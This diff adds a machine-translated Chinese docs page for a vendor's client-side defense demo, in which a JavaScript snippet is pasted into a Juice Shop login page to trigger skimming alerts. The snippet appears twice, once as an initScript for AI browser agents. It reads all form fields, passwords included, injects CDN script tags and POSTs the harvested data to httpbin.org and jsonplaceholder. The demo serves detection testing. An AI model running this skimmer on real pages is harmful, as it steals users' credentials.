@@ -1,0 +1,231 @@
+---
+title: 觸發檢測
+description: 攻擊檢測觸發、閾值調整和信號驗證
+sidebar:
+  order: 6
+  label: 觸發檢測
+i18n:
+  sourceHash: 3c5915b65966
+  translator: machine
+---
+
+import { Aside, Code, Steps } from "@astrojs/starlight/components";
+import Screenshot from "@f5xc-salesdemos/docs-theme/components/Screenshot.astro";
+
+export const combinedScript = `// CSD Demo — Combined Detection Script
+// Triggers ALL CSD detection signals: field reads, script injection, exfiltration
+(function() {
+    console.log('='.repeat(50));
+    console.log('[CSD Demo] Combined Detection Script — Starting');
+    console.log('='.repeat(50));
+
+    // Phase 1: Harvest all form fields (CSD tracks field reads on page-load DOM fields)
+    console.log('\\n[Formjack] Phase 1: Form field harvesting');
+    var inputs = document.querySelectorAll('input');
+    var harvested = {};
+    inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        harvested[name] = input.value || '(empty)';
+    });
+    console.log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+
+    // Phase 2: Inject third-party scripts from 4 CDN domains
+    console.log('\\n[Supply Chain] Phase 2: Multi-CDN script injection');
+    var cdns = [
+        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
+        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
+        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
+        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
+    ];
+    cdns.forEach(function(cdn) {
+        var script = document.createElement('script');
+        script.src = cdn.url;
+        script.onload = function() {
+            console.log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url);
+        };
+        script.onerror = function() {
+            console.log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url);
+        };
+        document.head.appendChild(script);
+        console.log('[Supply Chain] Injected script tag: ' + cdn.name);
+    });
+
+    // Phase 3: Exfiltrate harvested data to external endpoints
+    console.log('\\n[Exfil] Phase 3: Data exfiltration');
+    var payload = JSON.stringify({
+        type: 'combined_demo',
+        credentials: harvested,
+        page: window.location.href,
+        timestamp: Date.now()
+    });
+
+    fetch('https://www.httpbin.org/post', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: payload
+    }).then(function() {
+        console.log('[Exfil] Data sent to www.httpbin.org');
+    });
+
+    fetch('https://jsonplaceholder.typicode.com/posts', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: payload
+    }).then(function() {
+        console.log('[Exfil] Data sent to jsonplaceholder.typicode.com');
+    });
+
+    // Summary
+    console.log('\\n' + '='.repeat(50));
+    console.log('[CSD Demo] Simulation complete');
+    console.log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+    console.log('[CSD Demo] Scripts injected: ' + cdns.length + ' (4 CDN domains)');
+    console.log('[CSD Demo] Exfil channels: 2 (fetch POST)');
+    console.log('[CSD Demo] Detection takes 5-10 minutes to appear in the CSD console.');
+    console.log('='.repeat(50));
+})();`;
+
+## 觸發檢測
+
+CSD 監控瀏覽器內的 JavaScript 行為。與 WAF 或 Bot Defense 不同，您無法使用 curl 命令觸發 CSD 檢測 — 這需要真實的瀏覽器端指令碼活動。下列組合指令碼在單一執行中觸發所有三個 CSD 檢測信號：表單欄位收集、來自多個 CDN 域的第三方指令碼注入和資料外洩至外部端點。
+
+### 執行組合模擬指令碼
+
+<Steps>
+1. 導覽至 Juice Shop **登入頁面**，位於 `https://botdemo.sales-demo.f5demos.com/#/login`
+
+2. 在表單欄位中輸入虛擬認證資料 — 在 **Email** 欄位中輸入 `test@example.com`，在 **Password** 欄位中輸入 `P@ssword123`（不提交表單）
+
+3. 開啟 DevTools (**F12** &rarr; **Console** 標籤)
+
+   <Screenshot light="/images/devtools-console-light.png" dark="/images/devtools-console-dark.png" alt="已準備好輸入指令碼的空 DevTools 主控台" />
+
+4. 將下列指令碼貼入主控台並按 **Enter** — 它會自動作為自執行函式執行
+
+   <Code code={combinedScript} lang="js" title="組合檢測指令碼" />
+
+5. 觀察分階段的 `[CSD Demo]` 主控台輸出，確認每個步驟：欄位收集、來自 4 個 CDN 域的指令碼注入和資料外洩。`esm.sh` 提供 ES 模組語法 (`export default …`) — 當作為傳統 `<script>` 標籤載入時，這會導致 `Uncaught SyntaxError: Cannot use import statement outside a module`。這是預期行為，不會影響 CSD 檢測（指令碼標籤仍然會被注入，網路請求仍然會被製作）
+
+   <Screenshot light="/images/devtools-console-output-light.png" dark="/images/devtools-console-output-dark.png" alt="執行模擬指令碼後的主控台輸出" />
+</Steps>
+
+### AI 自動化執行
+
+具有瀏覽器自動化工具的 AI 助手（MCP Chrome DevTools、Playwright、Puppeteer）以程式方式執行模擬，而不是按照上述手動步驟：
+
+1. **使用 initScript 導覽** — 首先導覽至 `about:blank` 以確保文件上下文清潔，然後 `navigate_page` 至登入頁面 URL（例如 `http://$F5XC_DOMAINNAME/#/login`），使用 `initScript` 在 zone.js 對其進行修補前保存原生 `setInterval`、`clearInterval`、`fetch` 和 `console.log`，輪詢登入表單欄位，透過原生 `HTMLInputElement.prototype.value` 設定器填充認證資料，並立即內聯執行組合檢測指令碼。使用下方逐字的 initScript。
+2. **關閉歡迎橫幅** — 使用 `Escape` 鍵按 `press_key` 以關閉歡迎橫幅。在後續訪問中，橫幅可能不會出現（已保存 Cookie）
+3. **等待完成** — 等待 10 秒讓所有 CDN 指令碼載入/錯誤回呼和 fetch 承諾解決完成
+4. **捕獲證據** — `list_console_messages` 以檢查 `[CSD Demo] Simulation complete`；`list_network_requests` 已篩選為 `script` 和 `fetch` 類型以驗證 HTTP 狀態碼
+
+**initScript 裝置（逐字 — 封裝組合檢測指令碼以進行自動化執行）：**
+
+```javascript
+// Save native references before zone.js patches them
+var _si = window.setInterval.bind(window);
+var _ci = window.clearInterval.bind(window);
+var _fetch = window.fetch.bind(window);
+var _log = window.console.log.bind(window.console);
+
+// Poll for login form fields, fill credentials, run detection script
+var _poll = _si(function() {
+  var emailEl = document.querySelector('input[type="email"]');
+  var passEl  = document.querySelector('input[type="password"]');
+  if (emailEl && passEl) {
+    _ci(_poll);
+    // Fill credentials via native setter (bypasses zone.js)
+    var nativeSet = Object.getOwnPropertyDescriptor(
+      window.HTMLInputElement.prototype, 'value').set;
+    nativeSet.call(emailEl, 'test@example.com');
+    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
+    nativeSet.call(passEl, 'P@ssword123');
+    passEl.dispatchEvent(new Event('input', { bubbles: true }));
+
+    // Run Combined Detection Script inline using native fetch for exfil
+    (function() {
+      _log('==================================================');
+      _log('[CSD Demo] Combined Detection Script — Starting');
+      _log('==================================================');
+
+      _log('\n[Formjack] Phase 1: Form field harvesting');
+      var inputs = document.querySelectorAll('input');
+      var harvested = {};
+      inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        harvested[name] = input.value || '(empty)';
+      });
+      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+
+      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
+      var cdns = [
+        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
+        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
+        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
+        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
+      ];
+      cdns.forEach(function(cdn) {
+        var script = document.createElement('script');
+        script.src = cdn.url;
+        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
+        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
+        document.head.appendChild(script);
+        _log('[Supply Chain] Injected script tag: ' + cdn.name);
+      });
+
+      _log('\n[Exfil] Phase 3: Data exfiltration');
+      var payload = JSON.stringify({
+        type: 'combined_demo', credentials: harvested,
+        page: window.location.href, timestamp: Date.now()
+      });
+      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
+        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
+      _fetch('https://jsonplaceholder.typicode.com/posts', {
+        method: 'POST', mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' }, body: payload
+      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });
+
+      _log('\n==================================================');
+      _log('[CSD Demo] Simulation complete');
+      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
+      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
+      _log('==================================================');
+    })();
+  }
+}, 300);
+```
+
+**關於原生 `fetch` 的注意：** 此裝置保存 `window.fetch.bind(window)` 以避免 zone.js 錯誤。這是所有攻擊模擬階段的正確行為。CSD 緩解會阻止指令碼載入（透過清除 `<script>` 標籤 `src` 值），而不是 `fetch()` 呼叫，因此保存原生 fetch 參考不會影響緩解行為。第 2 和第 3 階段使用相同的 initScript。
+
+<Aside type="caution">
+**zone.js 不相容** — Juice Shop 使用 Angular 的 zone.js，它會修補 `setTimeout`、`setInterval`、`fetch`、`XMLHttpRequest` 和其他瀏覽器 API。這會導致 MCP `evaluate_script`、`fill` 和 `click` 工具因 `Cannot read properties of undefined (reading 'call')` 而中斷。改用 `navigate_page` 搭配 `initScript` — `initScript` 在 zone.js 載入前執行，因此您可以保存原生 API 參考。initScript 必須使用原生 `HTMLInputElement.prototype.value` 設定器（而不是 `fill` 工具）填充表單欄位，並在 `setInterval` 回呼內內聯執行檢測指令碼。
+</Aside>
+
+<Aside type="note">
+**initScript 累積** — 每個使用 `initScript` 參數的 `navigate_page` 呼叫都會將指令碼新增至在該瀏覽器上下文中每個後續文件載入時執行的持久清單。為了避免過時指令碼造成干擾，請在執行之間導覽至 `about:blank`，或使用具有 `isolatedContext` 的 `new_page` 以獲得清潔的上下文。
+</Aside>
+
+沒有瀏覽器自動化工具的操作人員使用上述手動步驟。
+
+<Aside type="tip">
+檢測需要 **5-10 分鐘** 才能出現在 CSD 儀表板上。如果執行指令碼後警報尚未可見，請繼續進行 [CSD 主控台逐步解說](/csd/csd-console/)，稍後檢查。
+</Aside>
+
+### 指令碼的作用
+
+組合模擬觸發所有三個 CSD 檢測信號：
+
+| 行為 | 指令碼的作用 | CSD 看到的內容 |
+| --- | --- | --- |
+| **欄位收集** | 讀取現有 `input` 元素（電子郵件、密碼）中的值 | 指令碼讀取敏感表單欄位 — 標記為高風險 |
+| **指令碼注入** | 附加 4 個 `<script>` 標籤，從 `cdn.jsdelivr.net`、`esm.sh`、`unpkg.com` 和 `ga.jspm.io` 載入 | 頁面上 4 個新的第三方指令碼域 |
+| **資料外洩** | 透過 `fetch` 將收集的資料傳送至 `www.httpbin.org` 和 `jsonplaceholder.typicode.com` | 外部域的網路呼叫（注意：fetch 目的地顯示為指令碼網路互動，不在網路域檢視中） |
+
+<Aside type="note">
+CSD 有特定的檢測邊界 — 例如，只追蹤頁面載入 DOM 欄位，網路檢視只顯示指令碼載入域。有關完整清單，請參閱[檢測邊界](/csd/overview/#detection-boundaries)。
+</Aside>
+
+### 進階模擬
+
+上述組合指令碼是簡化的 3 階段版本（收集、注入、外洩），適合大多數演示。[攻擊指令碼庫](/csd/attack-scripts/)提供 10 個按攻擊類型組織的目標指令碼，包括在組合指令碼的涵蓋範圍之上新增 DOM 操作、Cookie 外洩和影像信標通道的**最大檢測**壓力測試。使用個別指令碼以隔離方式展示特定攻擊類別（表單竄改、數位盜用、供應鏈注入、資料外洩、DOM 操作）。
